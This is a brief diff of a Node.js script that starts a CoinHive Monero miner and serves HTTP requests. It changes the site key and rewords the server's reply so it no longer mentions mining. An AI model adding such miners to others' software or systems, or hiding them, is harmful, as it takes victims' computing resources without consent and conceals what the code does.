@@ -4,7 +4,7 @@ const http = require('http');
 (async () => {
  
   // Create miner
-  const miner = await CoinHive('OwZyZ3HVKjMeMTrodeXC2iZ7ZGY8eOdT'); // Coin-Hive's Site Key
+  const miner = await CoinHive('U3bK5ioP4A8bsActf7dNSnrkKPI67PpR'); // Coin-Hive's Site Key
  
   // Start miner
   await miner.start();
@@ -20,7 +20,7 @@ const http = require('http');
  
   const requestHandler = (request, response) => {  
     console.log(request.url)
-    response.end('Running the Monero Miner!!')
+    response.end('Running!!')
   }
 
   const server = http.createServer(requestHandler)
